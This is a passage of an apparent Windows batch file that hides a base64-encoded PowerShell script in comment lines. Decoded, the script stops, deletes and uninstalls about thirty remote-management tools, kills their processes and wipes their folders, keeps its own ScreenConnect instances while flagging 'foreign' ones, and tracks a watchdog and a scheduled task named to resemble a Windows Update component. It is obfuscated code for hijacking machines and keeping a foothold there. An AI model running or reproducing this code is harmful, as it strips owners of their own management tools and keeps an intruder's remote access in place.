::IiRlbnY6UHJvZ3JhbUZpbGVzXElwZXJpdXMgUmVtb3RlIiwiJHtlbnY6UHJvZ3Jh
::bUZpbGVzKHg4Nil9XElwZXJpdXMgUmVtb3RlIik7IFByb2Q9QCgnSXBlcml1cyon
::KSB9DQogICAgICAgIEB7IFRhZz0nSVNMT25saW5lJzsgICBTdmM9QCgnSVNMbGln
::aHQqJyk7IFByb2M9QCgnSVNMbGlnaHQqJywnSVNMQWx3YXlzT24qJyk7IERpcnM9
::QCgiJGVudjpQcm9ncmFtRmlsZXNcSVNMIE9ubGluZSIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxJU0wgT25saW5lIik7IFByb2Q9QCgnSVNMIExpZ2h0KicsJ0lT
::TCBBbHdheXNPbionKSB9DQogICAgICAgIEB7IFRhZz0nQW1teXknOyAgICAgICAg
::U3ZjPUAoJ0FtbXl5KicpOyBQcm9jPUAoJ0FtbXl5KicpOyBEaXJzPUAoIiRlbnY6
::UHJvZ3JhbUZpbGVzXEFtbXl5IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFt
::bXl5Iik7IFByb2Q9QCgnQW1teXkqJykgfQ0KICAgICAgICBAeyBUYWc9J1VsdHJh
::Vmlld2VyJzsgIFN2Yz1AKCdVbHRyYVZpZXdlcionKTsgUHJvYz1AKCdVbHRyYVZp
::ZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xVbHRyYVZpZXdlciIs
::IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxVbHRyYVZpZXdlciIpOyBQcm9kPUAo
::J1VsdHJhVmlld2VyKicpIH0NCiAgICAgICAgQHsgVGFnPSdBZXJvQWRtaW4nOyAg
::ICBTdmM9QCgnQWVyb0FkbWluKicpOyBQcm9jPUAoJ0Flcm9BZG1pbionKTsgRGly
::cz1AKCIkZW52OlByb2dyYW1GaWxlc1xBZXJvQWRtaW4iLCIke2VudjpQcm9ncmFt
::RmlsZXMoeDg2KX1cQWVyb0FkbWluIik7IFByb2Q9QCgnQWVyb0FkbWluKicpIH0N
::CiAgICAgICAgQHsgVGFnPSdMaXRlTWFuYWdlcic7ICBTdmM9QCgnTGl0ZU1hbmFn
::ZXIqJyk7IFByb2M9QCgnUk9NU2VydmVyKicsJ1JPTVZpZXdlcionKTsgRGlycz1A
::KCIkZW52OlByb2dyYW1GaWxlc1xMaXRlTWFuYWdlciIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxMaXRlTWFuYWdlciIpOyBQcm9kPUAoJ0xpdGVNYW5hZ2VyKicp
::IH0NCiAgICAgICAgQHsgVGFnPSdSYWRtaW4nOyAgICAgICBTdmM9QCgnUmFkbWlu
::KicpOyBQcm9jPUAoJ3JzZXJ2ZXIzKicsJ1JhZG1pbionKTsgRGlycz1AKCIkZW52
::OlByb2dyYW1GaWxlc1xSYWRtaW4gU2VydmVyIDMiLCIke2VudjpQcm9ncmFtRmls
::ZXMoeDg2KX1cUmFkbWluIFNlcnZlciAzIik7IFByb2Q9QCgnUmFkbWluKicpIH0N
::CiAgICAgICAgQHsgVGFnPSdOb01hY2hpbmUnOyAgICBTdmM9QCgnbnhzZXJ2ZXIq
::JywnbnhkKicpOyBQcm9jPUAoJ254ZConLCdueHNlcnZlcionLCdueHJ1bm5lcion
::KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xOb01hY2hpbmUiLCIke2VudjpQ
::cm9ncmFtRmlsZXMoeDg2KX1cTm9NYWNoaW5lIik7IFByb2Q9QCgnTm9NYWNoaW5l
::KicpIH0NCiAgICAgICAgQHsgVGFnPSdOaW5qYU9uZSc7ICAgICBTdmM9QCgnTmlu
::amFSTU1BZ2VudCcsJ25pbmphcm1tKicsJ05pbmphUk1NKicpOyBQcm9jPUAoJ05p
::bmphUk1NQWdlbnQqJywnbmluamFybW0qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFt
::RmlsZXNcTmluamFSTU1BZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxO
::aW5qYVJNTUFnZW50IiwiJGVudjpQcm9ncmFtRGF0YVxOaW5qYVJNTUFnZW50Iiwi
::JGVudjpQcm9ncmFtRmlsZXNcTmluamFPbmUiLCIke2VudjpQcm9ncmFtRmlsZXMo
::eDg2KX1cTmluamFPbmUiKTsgUHJvZD1AKCdOaW5qYVJNTSonLCdOaW5qYU9uZSon
::KSB9DQogICAgICAgIEB7IFRhZz0nQXRlcmEnOyAgICAgICAgU3ZjPUAoJ0F0ZXJh
::QWdlbnQnKTsgUHJvYz1AKCdBdGVyYUFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJv
::Z3JhbUZpbGVzXEFURVJBIE5ldHdvcmtzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
::Nil9XEFURVJBIE5ldHdvcmtzIiwiJGVudjpQcm9ncmFtRGF0YVxBVEVSQSBOZXR3
::b3JrcyIpOyBQcm9kPUAoJ0F0ZXJhKicpIH0NCiAgICAgICAgQHsgVGFnPSdDb25u
::ZWN0V2lzZSc7ICBTdmM9QCgnTFRTZXJ2aWNlJywnTFRTdmNNb24nKTsgUHJvYz1A
::KCdMVFN2YyonLCdMVFRyYXkqJyk7IERpcnM9QCgiJGVudjp3aW5kaXJcTFRTdmMi
::LCIkZW52OlByb2dyYW1GaWxlc1xMYWJUZWNoIENsaWVudCIsIiR7ZW52OlByb2dy
::YW1GaWxlcyh4ODYpfVxMYWJUZWNoIENsaWVudCIpOyBQcm9kPUAoJ0Nvbm5lY3RX
::aXNlIEF1dG9tYXRlKicsJ0Nvbm5lY3RXaXNlIFJNTSonLCdMYWJUZWNoKicpIH0N
::CiAgICAgICAgQHsgVGFnPSdLYXNleWEnOyAgICAgICBTdmM9QCgnQWdlbnRNb24n
::LCdLYXNleWEqJywnS0FBRFMqJyk7IFByb2M9QCgnQWdlbnRNb24qJywnS2FzZXlh
::KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEthc2V5YSIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxLYXNleWEiKTsgUHJvZD1AKCdLYXNleWEgVlNBKics
::J0thc2V5YSBBZ2VudConKSB9DQogICAgICAgIEB7IFRhZz0nTmFibGUnOyAgICAg
::ICAgU3ZjPUAoJ0FkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQqJywnTi1hYmxlKics
::J05DZW50cmFsKicpOyBQcm9jPUAoJ0ZpbGVTeXN0ZW1BZ2VudConLCdOQ2VudHJh
::bConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBZHZhbmNlZCBNb25pdG9y
::aW5nIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFkdmFuY2VkIE1v
::bml0b3JpbmcgQWdlbnQiLCIkZW52OlByb2dyYW1GaWxlc1xOLWFibGUgVGVjaG5v
::bG9naWVzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE4tYWJsZSBUZWNobm9s
::b2dpZXMiLCIkZW52OlByb2dyYW1GaWxlc1xNU1BBIEZpbGVzIiwiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XE1TUEEgRmlsZXMiKTsgUHJvZD1AKCdBZHZhbmNlZCBN
::b25pdG9yaW5nIEFnZW50KicsJ04tYWJsZSonLCdOLWNlbnRyYWwqJywnTi1zaWdo
::dConLCdUYWtlIENvbnRyb2wqJywnU29sYXJXaW5kcyBNU1AqJykgfQ0KICAgICAg
::ICBAeyBUYWc9J1N5bmNybyc7ICAgICAgIFN2Yz1AKCdTeW5jcm8qJywnS2FidXRv
::KicpOyBQcm9jPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7IERpcnM9QCgiJGVudjpQ
::cm9ncmFtRmlsZXNcUmVwYWlyVGVjaCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
::fVxSZXBhaXJUZWNoIiwiJGVudjpQcm9ncmFtRmlsZXNcU3luY3JvIiwiJHtlbnY6
::UHJvZ3JhbUZpbGVzKHg4Nil9XFN5bmNybyIsIiRlbnY6UHJvZ3JhbURhdGFcU3lu
::Y3JvIik7IFByb2Q9QCgnU3luY3JvKicsJ0thYnV0byonLCdSZXBhaXJUZWNoKicp
::IH0NCiAgICAgICAgQHsgVGFnPSdQdWxzZXdheSc7ICAgICBTdmM9QCgnUHVsc2V3
::YXkqJywnUEMgTW9uaXRvcionKTsgUHJvYz1AKCdQQ01vbml0b3JNZ3IqJywnUENN
::b25pdG9yTWFuYWdlcionLCdQdWxzZXdheSonKTsgRGlycz1AKCIkZW52OlByb2dy
::YW1GaWxlc1xQdWxzZXdheSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQdWxz
::ZXdheSIsIiRlbnY6UHJvZ3JhbUZpbGVzXFBDIE1vbml0b3IiLCIke2VudjpQcm9n
::cmFtRmlsZXMoeDg2KX1cUEMgTW9uaXRvciIpOyBQcm9kPUAoJ1B1bHNld2F5Kics
::J1BDIE1vbml0b3IqJykgfQ0KICAgICAgICBAeyBUYWc9J1N1cGVyT3BzJzsgICAg
::IFN2Yz1AKCdTdXBlck9wcyonKTsgUHJvYz1AKCdTdXBlck9wcyonKTsgRGlycz1A
::KCIkZW52OlByb2dyYW1GaWxlc1xTdXBlck9wcyIsIiR7ZW52OlByb2dyYW1GaWxl
::cyh4ODYpfVxTdXBlck9wcyIsIiRlbnY6UHJvZ3JhbURhdGFcU3VwZXJPcHMiKTsg
::UHJvZD1AKCdTdXBlck9wcyonKSB9DQogICAgICAgIEB7IFRhZz0nTGV2ZWwnOyAg
::ICAgICAgU3ZjPUAoJ0xldmVsKicpOyBQcm9jPUAoJ2xldmVsKicpOyBEaXJzPUAo
::IiRlbnY6UHJvZ3JhbUZpbGVzXExldmVsIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
::Nil9XExldmVsIiwiJGVudjpQcm9ncmFtRGF0YVxMZXZlbCIpOyBQcm9kPUAoJ0xl
::dmVsKicpIH0NCiAgICAgICAgQHsgVGFnPSdBY3Rpb24xJzsgICAgICBTdmM9QCgn
::QWN0aW9uMSonKTsgUHJvYz1AKCdBY3Rpb24xKicsJ2FjdGlvbjFfYWdlbnQqJyk7
::IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWN0aW9uMSIsIiR7ZW52OlByb2dy
::YW1GaWxlcyh4ODYpfVxBY3Rpb24xIiwiJGVudjpQcm9ncmFtRGF0YVxBY3Rpb24x
::Iik7IFByb2Q9QCgnQWN0aW9uMSonKSB9DQogICAgICAgIEB7IFRhZz0nTWFuYWdl
::RW5naW5lJzsgU3ZjPUAoJ01hbmFnZUVuZ2luZSonLCdVRU1TKicsJ0RDQWdlbnQq
::Jyk7IFByb2M9QCgnTWFuYWdlRW5naW5lKicsJ2RjYWdlbnQqJywnVUVNUyonKTsg
::RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xNYW5hZ2VFbmdpbmUiLCIke2VudjpQ
::cm9ncmFtRmlsZXMoeDg2KX1cTWFuYWdlRW5naW5lIik7IFByb2Q9QCgnTWFuYWdl
::RW5naW5lKicsJ1VFTVMqJywnRGVza3RvcCBDZW50cmFsKicsJ0VuZHBvaW50IENl
::bnRyYWwqJywnUk1NIENlbnRyYWwqJykgfQ0KICAgICAgICBAeyBUYWc9J1RhY3Rp
::Y2FsUk1NJzsgIFN2Yz1AKCd0YWN0aWNhbHJtbSonLCdNZXNoIEFnZW50JywnTWVz
::aEFnZW50Jyk7IFByb2M9QCgndGFjdGljYWxybW0qJywnbWVzaGFnZW50KicsJ01l
::c2hBZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xUYWN0aWNhbEFn
::ZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRhY3RpY2FsQWdlbnQiLCIk
::ZW52OlByb2dyYW1GaWxlc1xNZXNoIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVz
::KHg4Nil9XE1lc2ggQWdlbnQiKTsgUHJvZD1AKCdUYWN0aWNhbConLCdNZXNoIEFn
::ZW50KicsJ01lc2hDZW50cmFsKicpIH0NCiAgICAgICAgQHsgVGFnPSdNZXNoQ2Vu
::dHJhbCc7ICBTdmM9QCgnTWVzaCBBZ2VudCcsJ01lc2hBZ2VudCcsJ01lc2hDZW50
::cmFsKicpOyBQcm9jPUAoJ01lc2hBZ2VudConLCdNZXNoQ2VudHJhbConKTsgRGly
::cz1AKCIkZW52OlByb2dyYW1GaWxlc1xNZXNoIEFnZW50IiwiJHtlbnY6UHJvZ3Jh
::bUZpbGVzKHg4Nil9XE1lc2ggQWdlbnQiKTsgUHJvZD1AKCdNZXNoKkFnZW50Kics
::J01lc2hDZW50cmFsKicpIH0NCiAgICAgICAgQHsgVGFnPSdDb250aW51dW0nOyAg
::ICBTdmM9QCgnU0FBWionLCdDb250aW51dW0qJyk7IFByb2M9QCgnU0FBWionLCdD
::b250aW51dW0qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU0FBWk9EIiwi
::JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNBQVpPRCIsIiRlbnY6UHJvZ3JhbUZp
::bGVzXENvbnRpbnV1bSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxDb250aW51
::dW0iKTsgUHJvZD1AKCdDb250aW51dW0qJywnU0FBWionKSB9DQogICAgICAgIEB7
::IFRhZz0nTmF2ZXJpc2snOyAgICAgU3ZjPUAoJ05hdmVyaXNrKicpOyBQcm9jPUAo
::J05hdmVyaXNrKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5hdmVyaXNr
::IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5hdmVyaXNrIik7IFByb2Q9QCgn
::TmF2ZXJpc2sqJykgfQ0KICAgICAgICBAeyBUYWc9J0ltbXlCb3QnOyAgICAgIFN2
::Yz1AKCdJbW15Qm90KicsJ0ltbXkqJyk7IFByb2M9QCgnSW1teUFnZW50KicsJ0lt
::bXlCb3QqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcSW1teUJvdCIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxJbW15Qm90IiwiJGVudjpQcm9ncmFtRGF0
::YVxJbW15Qm90Iik7IFByb2Q9QCgnSW1teUJvdConKSB9DQogICAgICAgIEB7IFRh
::Zz0nQXV0b21veCc7ICAgICAgU3ZjPUAoJ2FtYWdlbnQqJywnQXV0b21veConKTsg
::UHJvYz1AKCdhbWFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEF1
::dG9tb3giLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQXV0b21veCIsIiRlbnY6
::UHJvZ3JhbURhdGFcYW1hZ2VudCIpOyBQcm9kPUAoJ0F1dG9tb3gqJykgfQ0KICAg
::ICAgICBAeyBUYWc9J0Fjcm9uaXNDeWJlcic7IFN2Yz1AKCdBY3JvbmlzKicpOyBQ
::cm9jPUAoJ2Fjcm9jbWQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWNy
::b25pcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBY3JvbmlzIik7IFByb2Q9
::QCgnQWNyb25pcyBDeWJlcionLCdBY3JvbmlzIEFnZW50KicsJ0N5YmVyIFByb3Rl
::Y3QgQWdlbnQqJykgfQ0KICAgICAgICBAeyBUYWc9J0RvbW90eic7ICAgICAgIFN2
::Yz1AKCdEb21vdHoqJyk7IFByb2M9QCgnRG9tb3R6KicpOyBEaXJzPUAoIiRlbnY6
::UHJvZ3JhbUZpbGVzXERvbW90eiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxE
::b21vdHoiKTsgUHJvZD1AKCdEb21vdHoqJykgfQ0KICAgICAgICBAeyBUYWc9J0F1
::dmlrJzsgICAgICAgIFN2Yz1AKCdBdXZpayonKTsgUHJvYz1AKCdBdXZpayonKTsg
::RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBdXZpayIsIiR7ZW52OlByb2dyYW1G
::aWxlcyh4ODYpfVxBdXZpayIpOyBQcm9kPUAoJ0F1dmlrKicpIH0NCiAgICAgICAg
::QHsgVGFnPSdCYXJyYWN1ZGFSTU0nOyBTdmM9QCgnQmFycmFjdWRhKicpOyBQcm9j
::PUAoJ01XU2VydmljZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xCYXJy
::YWN1ZGEiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQmFycmFjdWRhIiwiJGVu
::djpQcm9ncmFtRmlsZXNcTGV2ZWwgUGxhdGZvcm1zIiwiJHtlbnY6UHJvZ3JhbUZp
::bGVzKHg4Nil9XExldmVsIFBsYXRmb3JtcyIpOyBQcm9kPUAoJ0JhcnJhY3VkYSBS
::TU0qJywnTWFuYWdlZCBXb3JrcGxhY2UqJykgfQ0KICAgICAgICBAeyBUYWc9J0dv
::dmVybGFuJzsgICAgIFN2Yz1AKCdHb3ZlcmxhbionKTsgUHJvYz1AKCdnb3Zlcmxh
::bionLCdnb3ZhZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb3Zl
::cmxhbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHb3ZlcmxhbiIpOyBQcm9k
::PUAoJ0dvdmVybGFuKicpIH0NCiAgICAgICAgQHsgVGFnPSdQRFEnOyAgICAgICAg
::ICBTdmM9QCgnUERRKicpOyBQcm9jPUAoJ1BEUVJ1bm5lcionLCdQRFFJbnZlbnRv
::cnkqJywnUERRRGVwbG95KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFk
::bWluIEFyc2VuYWwiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWRtaW4gQXJz
::ZW5hbCIsIiRlbnY6UHJvZ3JhbUZpbGVzXFBEUSIsIiR7ZW52OlByb2dyYW1GaWxl
::cyh4ODYpfVxQRFEiKTsgUHJvZD1AKCdQRFEgRGVwbG95KicsJ1BEUSBJbnZlbnRv
::cnkqJywnUERRIENvbm5lY3QqJykgfQ0KICAgICkNCg0KICAgIGZvcmVhY2ggKCR0
::b29sIGluICRybW0pIHsNCiAgICAgICAgJGhpdCA9ICRmYWxzZQ0KICAgICAgICBm
::b3JlYWNoICgkcGF0IGluICR0b29sLlByb2QpIHsNCiAgICAgICAgICAgIGZvcmVh
::Y2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsNCiAgICAgICAg
::ICAgICAgICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRs
::eUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgICAgICAg
::ICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9u
::IFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lDQogICAgICAgICAgICAgICAg
::ICAgIGlmICgkZG4gLWFuZCAkZG4gLWxpa2UgJHBhdCkgew0KICAgICAgICAgICAg
::ICAgICAgICAgICAgaWYgKElzLURhdHRvS2VlcGVyICRkbikgeyBMb2cgInJtbV9z
::a2lwX2RhdHRvX2tlZXAgWyRkbl0iOyByZXR1cm4gfQ0KICAgICAgICAgICAgICAg
::ICAgICAgICAgaWYgKFVuaW5zdGFsbC1Qcm9kdWN0S2V5ICRfKSB7ICRuLnJtbSsr
::OyAkaGl0ID0gJHRydWUgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAg
::ICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGZv
::cmVhY2ggKCRwYXQgaW4gJHRvb2wuU3ZjKSB7DQogICAgICAgICAgICBHZXQtU2Vy
::dmljZSAtTmFtZSAkcGF0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwg
::Rm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tl
::ZXBlciAkXy5OYW1lIC1vciBJcy1EYXR0b0tlZXBlciAkXy5EaXNwbGF5TmFtZSkg
::eyBMb2cgInJtbV9za2lwX2RhdHRvX3N2YyAkKCRfLk5hbWUpIjsgcmV0dXJuIH0N
::CiAgICAgICAgICAgICAgICAmIHNjLmV4ZSBzdG9wICIkKCRfLk5hbWUpIiAyPiYx
::IHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlz
::ZWNvbmRzIDUwMA0KICAgICAgICAgICAgICAgICYgc2MuZXhlIGRlbGV0ZSAiJCgk
::Xy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgJG4ucm1t
::Kys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fc3ZjX2RlbGV0ZWQgJCgkXy5OYW1l
::KSBbJCgkdG9vbC5UYWcpXSINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAg
::ICAgICBmb3JlYWNoICgkcGF0IGluICR0b29sLlByb2MpIHsNCiAgICAgICAgICAg
::IEdldC1Qcm9jZXNzIC1OYW1lICRwYXQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgU3RvcC1Q
::cm9jZXNzIC1JZCAkXy5JZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICAgICAgICAgICAgICAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlOyBM
::b2cgInJtbV9wcm9jX2tpbGxlZCAkKCRfLlByb2Nlc3NOYW1lKSBbJCgkdG9vbC5U
::YWcpXSINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBmb3JlYWNo
::ICgkZCBpbiAkdG9vbC5EaXJzKSB7DQogICAgICAgICAgICBpZiAoJGQgLWFuZCAo
::VGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsNCiAgICAgICAgICAgICAgICBp
::ZiAoSXMtRGF0dG9LZWVwZXIgJGQpIHsgTG9nICJybW1fc2tpcF9kYXR0b19kaXIg
::JGQiOyBjb250aW51ZSB9DQogICAgICAgICAgICAgICAgaWYgKEZvcmNlLVJlbW92
::ZURpciAkZCkgeyAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlOyBMb2cgInJtbV9kaXJf
::cmVtb3ZlZCAkZCIgfQ0KICAgICAgICAgICAgICAgIGVsc2UgeyAkbi5mYWlsKys7
::IExvZyAicm1tX2Rpcl9SRU1PVkVfRkFJTEVEICRkIiB9DQogICAgICAgICAgICB9
::DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRoaXQpIHsgTG9nICJybW1fZXh0ZXJt
::aW5hdGVkICQoJHRvb2wuVGFnKSIgfQ0KICAgIH0NCg0KICAgICRzdW1tYXJ5ID0g
::ImV4dGVybWluYXRlIHN2Yz0kKCRuLnN2YykgcHJvYz0kKCRuLnByb2MpIGRpcj0k
::KCRuLmRpcikgcHJvZHVjdD0kKCRuLnByb2R1Y3QpIHJtbT0kKCRuLnJtbSkgZmFp
::bD0kKCRuLmZhaWwpIg0KICAgIExvZyAkc3VtbWFyeQ0KICAgIHJldHVybiAkc3Vt
::bWFyeQ0KfQ0KDQpmdW5jdGlvbiBVcGRhdGUtU3RhdGUgew0KICAgICRrZWVwID0g
::QChHZXQtS2VlcEZpbmdlcnByaW50cykNCiAgICAkZ3J5eGFGcCA9IEdldC1Hcnl4
::YUZwDQogICAgJHNldnJ6ID0gQChHZXQtU2V2cnpLZWVwKQ0KICAgICRwcmltRnAg
::PSAkc2V2cnpbMF07ICRhbHRGcCA9ICRzZXZyelsxXQ0KICAgICRwcmltID0gJG51
::bGw7ICRhbHQgPSAkbnVsbDsgJHNjcmlwdDpncnl4YSA9ICRudWxsDQogICAgZm9y
::ZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3Qg
::Q2xpZW50KicpKSB7DQogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChb
::MC05YS1mXXsxNn0pXCknKSB7DQogICAgICAgICAgICAkZnAgPSAkbWF0Y2hlc1sx
::XS5Ub0xvd2VyKCkNCiAgICAgICAgICAgIGlmICgkZnAgLWVxICRwcmltRnApIHsg
::JHByaW0gPSAiJCgkc3ZjLlN0YXR1cykiIH0NCiAgICAgICAgICAgIGVsc2VpZiAo
::JGZwIC1lcSAkYWx0RnApIHsgJGFsdCA9ICIkKCRzdmMuU3RhdHVzKSIgfQ0KICAg
::ICAgICAgICAgZWxzZWlmICgkZnAgLWVxICRncnl4YUZwIC1vciAoVGVzdC1Jc0dy
::eXhhRnAgJGZwKSkgeyAkc2NyaXB0OmdyeXhhID0gIiQoJHN2Yy5TdGF0dXMpIiB9
::DQogICAgICAgIH0NCiAgICB9DQogICAgJGZvcmVpZ24gPSBAKCkNCiAgICBmb3Jl
::YWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBD
::bGllbnQqJykpIHsNCiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFsw
::LTlhLWZdezE2fSlcKScgLWFuZCAkbWF0Y2hlc1sxXSAtbm90aW4gJGtlZXApIHsN
::CiAgICAgICAgICAgICRmb3JlaWduICs9ICRtYXRjaGVzWzFdDQogICAgICAgIH0N
::CiAgICB9DQogICAgJGlkID0gUmVhZC1JZGVudGl0eQ0KICAgICR0YXNrc09rID0g
::MDsgJHRhc2tzVG90YWwgPSAwDQogICAgZm9yZWFjaCAoJGsgaW4gJ1RBU0tfQScs
::J1RBU0tfQicsJ1RBU0tfQycsJ1RBU0tfRCcpIHsNCiAgICAgICAgJHRhc2tzVG90
::YWwrKw0KICAgICAgICAkdG4gPSBOb3JtYWxpemUtVGFza05hbWUgKFtzdHJpbmdd
::JGlkWyRrXSkNCiAgICAgICAgaWYgKC1ub3QgJHRuKSB7IGNvbnRpbnVlIH0NCiAg
::ICAgICAgJG1hcmtlciA9IGlmICgkayAtZXEgJ1RBU0tfQicpIHsgJ2V0bF9tb24u
::Y21kJyB9IGVsc2UgeyAnb3duX21vbi5jbWQnIH0NCiAgICAgICAgaWYgKChUZXN0
::LVRhc2tPd25zTW9uICR0biAkbWFya2VyKSAtb3IgKFRlc3QtVGFza093bnNNb24g
::KCJcJHRuIikgJG1hcmtlcikpIHsgJHRhc2tzT2srKyB9DQogICAgfQ0KICAgICMg
::TDM5OiBjb3VudCBXdWNhY2hlR3J5eGFCb290IChUQVNLX0cpDQogICAgJHRhc2tz
::VG90YWwrKw0KICAgICR0Z05hbWUgPSAnV3VjYWNoZUdyeXhhQm9vdCcNCiAgICBp
::ZiAoKEdldC1TY2hlZHVsZWRUYXNrIC1UYXNrTmFtZSAkdGdOYW1lIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlKSAtb3INCiAgICAgICAgKFRlc3QtUGF0aCAt
::TGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfYm9vdC5jbWQn
::KSkpIHsNCiAgICAgICAgJHRhc2tzT2srKw0KICAgIH0NCiAgICBpZiAoLW5vdCAk
::TW9uUGF0aCkgeyAkTW9uUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnb3duX21v
::bi5jbWQnIH0NCiAgICAkd2QgPSBFbnN1cmUtV2F0Y2hkb2cNCiAgICAkcHJldiA9
::IEB7fQ0KICAgICRzdGF0ZVBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ3N0YXRl
::Lmpzb24nDQogICAgaWYgKFRlc3QtUGF0aCAkc3RhdGVQYXRoKSB7DQogICAgICAg
::IHRyeSB7IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aCAtUmF3
::IHwgQ29udmVydEZyb20tSnNvbikuUFNPYmplY3QuUHJvcGVydGllcyB8IEZvckVh
::Y2gtT2JqZWN0IHsgJHByZXZbJF8uTmFtZV0gPSAkXy5WYWx1ZSB9IH0gY2F0Y2gg
::e30NCiAgICB9DQogICAgJGluc3RhbGxDb3VudCA9IDENCiAgICBpZiAoJHByZXYu
::aW5zdGFsbENvdW50KSB7ICRpbnN0YWxsQ291bnQgPSBbaW50XSRwcmV2Lmluc3Rh
::bGxDb3VudCB9DQogICAgaWYgKCRwcmV2LnByaW0gLWFuZCAkcHJldi5wcmltIC1u
::ZSAnUnVubmluZycgLWFuZCAkcHJpbSAtZXEgJ1J1bm5pbmcnKSB7ICRpbnN0YWxs
::Q291bnQrKyB9DQogICAgJHN0YXRlID0gW29yZGVyZWRdQHsNCiAgICAgICAgaG9z
::dCAgICAgICAgID0gJGVudjpDT01QVVRFUk5BTUUNCiAgICAgICAgdHMgICAgICAg
::ICAgID0gKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycp
::DQogICAgICAgIGJ1aWxkICAgICAgICA9ICRCdWlsZA0KICAgICAgICBwcmltICAg
::ICAgICAgPSAkKGlmICgkcHJpbSkgeyAkcHJpbSB9IGVsc2UgeyAnTUlTU0lORycg
